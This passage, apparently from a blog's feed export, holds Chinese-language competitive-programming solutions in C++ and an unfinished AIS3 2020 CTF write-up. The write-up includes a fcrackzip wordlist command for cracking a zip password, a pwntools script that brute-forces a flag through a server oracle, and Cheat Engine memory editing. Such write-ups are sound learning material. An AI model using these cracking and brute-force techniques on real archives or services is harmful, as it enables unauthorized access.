<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>輸入時間複雜度為 $O(n)$<br>查詢時間複雜度約為 $O(logm)$<br>總時間複雜度 $O(n+logm)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Binary Search</tag>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
        <tag>sort</tag>
        <tag>Map</tag>
      </tags>
  </entry>
  <entry>
    <title>Zerojudge e288</title>
    <url>/2020/06/28/Zerojudge%20e288/</url>
    <content><![CDATA[<h1 id="Zerojudge-e288"><a href="#Zerojudge-e288" class="headerlink" title="Zerojudge e288"></a>Zerojudge e288</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="https://zerojudge.tw/ShowProblem?problemid=e288" target="_blank" rel="noopener">https://zerojudge.tw/ShowProblem?problemid=e288</a><br>定義兩字串互為CP必須符合</p>
<ol>
<li>無任何字母相同</li>
<li>須包含所有範圍內的字母</li>
</ol>
<p>給 $n$ 個字串，求CP對數總和</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>暴力搜尋，複雜度 $O(m^2)$，只有25分</p>
<p>我們可以嘗試把一個字串所包含的字元以bit表示<br>而全部有 <code>A~Z</code> <code>a~i</code> 共38個字母，可以分別以1bit表示各個字母<br>而搜尋每次只需要利用xor的特性，很快就可以獲得差集<br>但是在搜尋的部分如果用 $O(m^2)$ 還是一樣差<br>嘗試將搜尋的內容塞入map中，使得查詢時間複雜度降至 $O(logm)$<br>為了方便塞入map，可以用long long，具有64個bit可以充分運用</p>
<h3 id="補充"><a href="#補充" class="headerlink" title="補充"></a>補充</h3><p>其實也不一定需要用到map<br>我們需要實現的只有能快速搜尋<br>可以先排序($O(logn)$)再二分搜($O(logn)$)<br>也可以達到map相同的效果</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> mask,tmp;</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">long</span> <span class="keyword">long</span>, <span class="keyword">int</span>&gt; mp;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">char_to_num</span><span class="params">(<span class="keyword">char</span> c)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(c&gt;=<span class="string">'A'</span> &amp;&amp; c&lt;=<span class="string">'Z'</span>)&#123;</span><br><span class="line">		<span class="keyword">return</span> c-<span class="string">'A'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">26</span>+c-<span class="string">'a'</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">		mask |= (<span class="number">1L</span>L &lt;&lt; i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;m ; i++)&#123;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">		tmp=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span> ; j&lt;s.size() ; j++)&#123;</span><br><span class="line">			tmp |= (<span class="number">1L</span>L&lt;&lt;(char_to_num(s[j])));</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(mp.count(tmp ^ mask)) ans+= mp[tmp ^ mask];</span><br><span class="line">		<span class="keyword">if</span>(mp.count(tmp)) mp[tmp]++;</span><br><span class="line">		<span class="keyword">else</span> mp[tmp]=<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><p>輸入時間複雜度為 $O(m)$<br>查詢時間複雜度約為 $O(logm)$<br>總時間複雜度 $O(m+logm)$</p>
]]></content>
      <categories>
        <category>Zerojudge</category>
        <category>APCS</category>
      </categories>
      <tags>
        <tag>Binary Search</tag>
        <tag>Zerojudge</tag>
        <tag>APCS</tag>
        <tag>sort</tag>
        <tag>Map</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa 591</title>
    <url>/2021/03/23/UVa591/</url>
    <content><![CDATA[<h1 id="UVa-591"><a href="#UVa-591" class="headerlink" title="UVa 591"></a>UVa 591</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?591" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?591</a></p>
<p>給一排疊得高高的積木群，現在我們要把他們得高度都變一樣，而每次我們可以將任意得一塊積木移動到另一排積木上</p>
<p>問最小移動次數，使得積木得高度能完全相同</p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>既然可以任意移動積木，那麼我們只需要關心高度高於平均值的積木堆，並將他們的積木平均給矮的積木堆</p>
<p>至於怎麼分給積木堆並不是我們關心的，所以我們只需要計算有哪些積木是需要移動的即可</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> arr[<span class="number">55</span>];</span><br><span class="line"><span class="keyword">int</span> cnt,n,ans,Case=<span class="number">1</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n &amp;&amp; n)&#123;</span><br><span class="line">		cnt=<span class="number">0</span>;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="built_in">cin</span>&gt;&gt;arr[i];</span><br><span class="line">			cnt+=arr[i];</span><br><span class="line">		&#125;</span><br><span class="line">		cnt/=n;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;n ; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(arr[i]&gt;cnt)</span><br><span class="line">				ans+=(arr[i]-cnt);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"Set #"</span>&lt;&lt;Case++&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">"The minimum number of moves is "</span>&lt;&lt;ans&lt;&lt;<span class="string">".\n\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="時間複雜度分析"><a href="#時間複雜度分析" class="headerlink" title="時間複雜度分析"></a>時間複雜度分析</h2><p>每筆測資輸入時間複雜度為 $O(n)$</p>
<p>找答案的時間複雜度為 $O(n)$</p>
<p>每筆測資總時間複雜度為 $O(2n)$ 約為 $O(n)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>UVa11084</title>
    <url>/2020/06/17/UVa11084/</url>
    <content><![CDATA[<h1 id="UVa11084"><a href="#UVa11084" class="headerlink" title="UVa11084"></a>UVa11084</h1><h2 id="題敘"><a href="#題敘" class="headerlink" title="題敘"></a>題敘</h2><p><a href="http://domen111.github.io/UVa-Easy-Viewer/?11084" target="_blank" rel="noopener">http://domen111.github.io/UVa-Easy-Viewer/?11084</a></p>
<h2 id="想法"><a href="#想法" class="headerlink" title="想法"></a>想法</h2><p>先暴力枚舉出數字的排列組合<br>再個別轉換成數字比較是否可以整除</p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LL long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOS ios::sync_with_stdio(false),cin.tie(0),cout.tie(0);</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pii pair<span class="meta-string">&lt;int,int&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> t,d,ans,cnt[<span class="number">10</span>];</span><br><span class="line"><span class="built_in">string</span> s;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> depth, <span class="keyword">long</span> <span class="keyword">long</span> res)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(depth == s.size())&#123;</span><br><span class="line">		<span class="keyword">if</span>(res%d == <span class="number">0</span>)&#123;</span><br><span class="line">			ans++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">10</span> ; i++)&#123;</span><br><span class="line">		<span class="keyword">if</span>(cnt[i]&gt;<span class="number">0</span>)&#123;</span><br><span class="line">			cnt[i]--;</span><br><span class="line">			dfs(depth+<span class="number">1</span>, res*<span class="number">10</span> + i);</span><br><span class="line">			cnt[i]++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	IOS</span><br><span class="line">	<span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">	<span class="keyword">while</span>(t--)&#123;</span><br><span class="line">		<span class="comment">//initialize</span></span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;<span class="number">10</span> ; i++)</span><br><span class="line">			cnt[i]=<span class="number">0</span>;</span><br><span class="line">		ans=<span class="number">0</span>;</span><br><span class="line">		<span class="built_in">cin</span>&gt;&gt;s&gt;&gt;d;</span><br><span class="line">		<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span> ; i&lt;s.size() ; i++)&#123;</span><br><span class="line">			cnt[s[i]-<span class="string">'0'</span>]++;</span><br><span class="line">		&#125;</span><br><span class="line">		dfs(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="string">"\n"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h2><ul>
<li>初始化<br>  $O(MaxN)$</li>
<li>DFS<br>  $O(len(s)!)$ (len(s)最大為10)</li>
</ul>
<p>整體複雜度: $O(tN!)$</p>
]]></content>
      <categories>
        <category>UVa</category>
      </categories>
      <tags>
        <tag>DFS</tag>
        <tag>UVa</tag>
      </tags>
  </entry>
  <entry>
    <title>TOJ 100</title>
    <url>/2021/03/23/TOJ100/</url>
    <content><![CDATA[<h1 id="TOJ-100"><a href="#TOJ-100" class="headerlink" title="TOJ 100"></a>TOJ 100</h1><h2 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h2><p><a href="https://toj.tfcis.org/oj/pro/100/" target="_blank" rel="noopener">https://toj.tfcis.org/oj/pro/100/</a></p>
<h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">//By Koios1143</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;(<span class="keyword">char</span>)(n<span class="number">-1</span>)&lt;&lt;<span class="string">'\n'</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><p>總時間複雜度為 $O(1)$</p>
]]></content>
      <categories>
        <category>TOJ</category>
      </categories>
      <tags>
        <tag>TOJ</tag>
      </tags>
  </entry>
  <entry>
    <title>AIS3 2020 pre-exam write-up</title>
    <url>/2020/07/05/AIS3%202020%20pre-exam%20write-up/</url>
    <content><![CDATA[<h1 id="AIS3-2020-pre-exam-write-up"><a href="#AIS3-2020-pre-exam-write-up" class="headerlink" title="AIS3 2020 pre-exam write-up"></a>AIS3 2020 pre-exam write-up</h1><p>今年第一次打AIS3 pre-exam，有很多第一次遇到的題目類型<br>稍微整理了一下我有解的題目的解題過程，歡迎大家一起討論~</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Piquero"><a href="#Piquero" class="headerlink" title="Piquero"></a>Piquero</h2><blockquote>
<p><strong>347 solves</strong></p>
</blockquote>
<h3 id="題目"><a href="#題目" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>I can’t see the flag. Where is it?</p>
</blockquote>
<h3 id="File"><a href="#File" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/87e27cc8a1a515c5bdbaab2a3f898dc9/Piquero_99c9aa83fe492df8d52229017d4dca92297c9aeb.jpg?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjE5fQ.Xt9thg.Z0yZLQ2FfFp1K0KIdZh0m93w87Y" target="_blank" rel="noopener">Piquero</a></p>
<h3 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h3><p>發現圖片內容是點字，於是到網路上找找點字的相關資料，會發現大概會是這樣:</p>
<ul>
<li>表示下個字母為大寫的tag<br>  <img src="https://i.imgur.com/n7Qv1La.png" alt=""></li>
<li>表示下個字元為數字<br>  <img src="https://i.imgur.com/sacvda7.png" alt=""></li>
<li>表示下個字原為符號<br>  <img src="https://i.imgur.com/1542Noc.png" alt=""><br>其餘的符號都是表示 <strong>字母</strong> / <strong>數字</strong><br>接下來對照網路上查到的table，就可以獲得flag</li>
</ul>
<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{I_feel_sleepy_Good_Night!!!}</code></p>
<h2 id="Karuego"><a href="#Karuego" class="headerlink" title="Karuego"></a>Karuego</h2><blockquote>
<p><strong>245 solves</strong></p>
</blockquote>
<h3 id="題目-1"><a href="#題目-1" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Students who fail to summon will be dropped out.</p>
</blockquote>
<h3 id="File-1"><a href="#File-1" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/6e929c470179fbd102d98db23b775425/Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjIwfQ.Xt9vew.SmgmT3hDj2oGR8K0ZwnbtJjhUd8" target="_blank" rel="noopener">Karuego</a></p>
<h3 id="解法-1"><a href="#解法-1" class="headerlink" title="解法"></a>解法</h3><p>對於png，先到binwalk裡檢查有沒有藏檔案，發現裡面有zip<br><img src="https://i.imgur.com/0FHUY8U.png" alt=""><br>發現到zip有經過加密，可透過fcrack搭配reckyou.txt爆破</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">fcrackzip -u -D -p rockyou.txt [zipname]</span><br></pre></td></tr></table></figure>
<p>最後會找到<code>lafire</code></p>
<h3 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{Ar3_y0u_r34l1y_r34dy_t0_summ0n_4_D3m0n?}</code></p>
<h2 id="Soy"><a href="#Soy" class="headerlink" title="Soy"></a>Soy</h2><blockquote>
<p><strong>172 solves</strong></p>
</blockquote>
<h3 id="題目-2"><a href="#題目-2" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Here is your flag. Oops, my bad.</p>
</blockquote>
<h3 id="File-2"><a href="#File-2" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/c5e1aa1353cedeea35505a6b57387297/Soy_b692c44dd2a32b30eee8a9315091d79f7dd8c8a8.png?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjIxfQ.Xt9yZw.uTwYRI5iSyL8wOWtM3St6OaLWag" target="_blank" rel="noopener">Soy</a></p>
<h3 id="解法-2"><a href="#解法-2" class="headerlink" title="解法"></a>解法</h3><p><strong>賽後解</strong><br>可以利用<a href="https://merricx.github.io/qrazybox/" target="_blank" rel="noopener">QRazyBox</a>幫助解題<br>在上面畫完後使用Tools的Extract即可</p>
<h3 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{H0w_c4n_y0u_f1nd_me?!?!?!!}</code></p>
<h2 id="Saburo"><a href="#Saburo" class="headerlink" title="Saburo"></a>Saburo</h2><blockquote>
<p><strong>108 solves</strong></p>
</blockquote>
<h3 id="題目-3"><a href="#題目-3" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>Spell you flag and fight with me.</p>
<p>PS. flag is printable characters with AIS3{…}</p>
<p>nc 60.250.197.227 11001</p>
</blockquote>
<h3 id="解法-3"><a href="#解法-3" class="headerlink" title="解法"></a>解法</h3><p>nc上去後發現只會問問題，給個字串後會回覆一個數字<br>猜測Flag前綴為AIS3{<br>依序放入後發現數字會是嚴格遞增的，所以我們只需要寫個腳本把所有Ascii中visible的字元都Try過<br>中間會出現多次誤差，可以單個字元測試3~5次以減少誤差</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">final_answer = <span class="string">'AIS3&#123;'</span></span><br><span class="line">max_num = <span class="number">0</span></span><br><span class="line">max_chr = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">	max_chr = <span class="string">' '</span></span><br><span class="line">	time.sleep(<span class="number">1</span>)</span><br><span class="line">	<span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">126</span>):</span><br><span class="line">		now_num = <span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">			r = remote(<span class="string">'60.250.197.227'</span>, <span class="string">'11001'</span>)</span><br><span class="line">			r.recvuntil(<span class="string">' '</span>)</span><br><span class="line">			r.sendline(final_answer+chr(j))</span><br><span class="line">			tmp_num = int(r.recvuntil(<span class="string">'\n'</span>).split(<span class="string">b' '</span>)[<span class="number">4</span>])</span><br><span class="line">			<span class="keyword">if</span>(tmp_num &lt; max_num):</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			now_num += tmp_num</span><br><span class="line">		now_num = int(now_num/<span class="number">3</span>)</span><br><span class="line">		<span class="keyword">if</span>(now_num &gt; max_num):</span><br><span class="line">			max_num = now_num</span><br><span class="line">			max_chr = chr(j)</span><br><span class="line">			print(chr(j) + <span class="string">': '</span> + str(now_num))</span><br><span class="line">		r.close()</span><br><span class="line">	final_answer += max_chr</span><br><span class="line">	print(<span class="string">'max_num: '</span> + str(max_num))</span><br><span class="line">	print(<span class="string">'max_chr: '</span> + str(max_chr))</span><br><span class="line">	print(<span class="string">'final: '</span> + final_answer)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{A1r1ght_U_4r3_my_3n3nnies}</code></p>
<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="TsaiBro"><a href="#TsaiBro" class="headerlink" title="TsaiBro"></a>TsaiBro</h2><blockquote>
<p><strong>281 solves</strong></p>
</blockquote>
<h3 id="題目-4"><a href="#題目-4" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>很好….你很腦殘嗎….敢這樣講刀劍神域…….我死也不會放過你 我..要..殺死…你..</p>
</blockquote>
<h3 id="File-3"><a href="#File-3" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/e5c6607ae2a2064a5d6557a07635c4d9/TsaiBroSaid?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjMzfQ.Xt913Q.EHy0Tl63eOr46omHxoueuAwokTw" target="_blank" rel="noopener">TsaiBroSaid</a><br><a href="https://pre-exam.ais3.org/files/7ad3e8255badfb74307edf17c49b0db4/TsaiBro?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjM0fQ.Xt913Q.57bxAT2F72tsh0UejnCiTKYoVfo" target="_blank" rel="noopener">TsaiBro</a></p>
<h3 id="解法-4"><a href="#解法-4" class="headerlink" title="解法"></a>解法</h3><p>其實一開始根本毫無頭緒(?<br>在網路上找資料找到去年的write-up，發現考點相同<br>這題是考Tap Code，在一個<code>發財</code>左右兩側各可以拿到一組點<br>這裡的點可以去透過Table對照到一個字元<br>而Table可以在<code>strings TsaiBro</code>看到這串字</p>
<p><img src="https://i.imgur.com/im8sEpk.png" alt=""></p>
<p>裡面總共有64個點，參考剛剛<code>發財</code>附近的點數，最高是8個點，可以猜測會是8*8的Table<br>建表完直接對照就可以獲得Flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">table = [<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'&#123;'</span>,<span class="string">'&#125;'</span>,<span class="string">'_'</span>,</span><br><span class="line"><span class="string">'W'</span>,<span class="string">'X'</span>,<span class="string">'Y'</span>,<span class="string">'0'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'A'</span>,<span class="string">'B'</span>,</span><br><span class="line"><span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,</span><br><span class="line"><span class="string">'S'</span>,<span class="string">'T'</span>,<span class="string">'U'</span>,<span class="string">'V'</span>,<span class="string">'G'</span>,<span class="string">'H'</span>,<span class="string">'I'</span>,<span class="string">'J'</span>,</span><br><span class="line"><span class="string">'K'</span>,<span class="string">'L'</span>,<span class="string">'M'</span>,<span class="string">'N'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,</span><br><span class="line"><span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,</span><br><span class="line"><span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'l'</span>,<span class="string">'O'</span>,<span class="string">'P'</span>,<span class="string">'Q'</span>,<span class="string">'R'</span>,</span><br><span class="line"><span class="string">'C'</span>,<span class="string">'D'</span>,<span class="string">'E'</span>,<span class="string">'F'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>]</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"./flag.txt"</span>,<span class="string">"r"</span>).read().split(<span class="string">'\n'</span>)[<span class="number">1</span>]</span><br><span class="line">f = f.split(<span class="string">"發財"</span>)[<span class="number">1</span>:]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(f),<span class="number">2</span>):</span><br><span class="line">    print(table[(len(f[i])<span class="number">-1</span>)*<span class="number">8</span>+(len(f[i+<span class="number">1</span>])<span class="number">-1</span>)],end=<span class="string">''</span>)</span><br></pre></td></tr></table></figure>

<h3 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h3><p><code>AIS3{y3s_y0u_h4ve_s4w_7h1s_ch4ll3ng3_bef0r3_bu7_its_m0r3_looooooooooooooooooong_7h1s_t1m3}</code></p>
<h2 id="Fallen-Beat"><a href="#Fallen-Beat" class="headerlink" title="Fallen Beat"></a>Fallen Beat</h2><blockquote>
<p><strong>171 solves</strong></p>
</blockquote>
<h3 id="題目-5"><a href="#題目-5" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>CTF player,</p>
<p>我要挑戰你, I’m gonna challenge you!!</p>
<p>ZR</p>
<p>這是我的室友兼 lab 同學,</p>
<p>他已經考過金框暴龍天，他是個旋鈕人,</p>
<p>不像你是個敲鍵盤的,</p>
<p>所以我要測測你的程度到哪裡,</p>
<p>就用 ZR 的大一 project 來決勝負吧！！</p>
<p>得到 Full Combo 來讓我刮目相看！！</p>
<p>author: terrynini</p>
</blockquote>
<h3 id="File-4"><a href="#File-4" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/06535c622222c7d33f2628fc899a69eb/Fallen_Beat.zip?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI5fQ.Xt93jQ.Ep49McTc9vlDK0bAagjYGL4fYNk" target="_blank" rel="noopener">Fallen_Beats</a></p>
<h3 id="解法-5"><a href="#解法-5" class="headerlink" title="解法"></a>解法</h3><p>可以發現到這是個幾乎不可能完成SS的音G<br>透過線上java decompiler decompile後可以知道，當達到MaxCombo時可以獲得Flag<br>雖然一開始Flag有給了一坨奇怪的東西，但是跟另一坨更怪的東西xor後，flag變得不可解<br>所以開始朝向玩Game發展<br>不過可以透過Cheat Engine幫你減速<br>但是譜很長，很容易失誤，所以說，CE還可以去改記憶體上的值<br>於是很開心的把值改成MaxCombo 1112<br>然後加速500倍直接結束遊戲</p>
<p>…然而，這不是結束<br><img src="https://i.imgur.com/N3CWVCR.png" alt=""><br>你可以透過decompile的內容得知flag是直接存在變數中，所以直接用CE找到AIS3即可</p>
<h3 id="AIS3"><a href="#AIS3" class="headerlink" title="AIS3"></a>AIS3</h3><p><code>AIS3{Wow_how_m4ny_h4nds_do_you_h4ve}</code></p>
<h2 id="Stand-up-Brain"><a href="#Stand-up-Brain" class="headerlink" title="Stand up!Brain"></a>Stand up!Brain</h2><blockquote>
<p><strong>62 solves</strong></p>
</blockquote>
<h3 id="題目-6"><a href="#題目-6" class="headerlink" title="題目"></a>題目</h3><blockquote>
<p>又到了 Brain tell 咪 ㄜ joke 的時間了</p>
<p>這次輪到你說個笑話來聽聽了</p>
</blockquote>
<h3 id="File-5"><a href="#File-5" class="headerlink" title="File"></a>File</h3><p><a href="https://pre-exam.ais3.org/files/5ba33eef5695107f022ab8e3151aaba5/joke?token=eyJ1c2VyX2lkIjoxOTUsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI4fQ.Xt95kw.-MkSvwqZ7Pe-SIpQehQOO5xg_b8" target="_blank" rel="noopener">joke</a></p>
<h3 id="解法-6"><a href="#解法-6" class="headerlink" title="解法"></a>解法</h3><p><strong>賽後解</strong><br>strings後會發現到裡面存有brain fuck<br>發現到執行後會失敗，因此會去重看字串<br>但是前面有一串連續的重複字串<br>刪除後就可以執行了<br>最後會剩下這些內容</p>
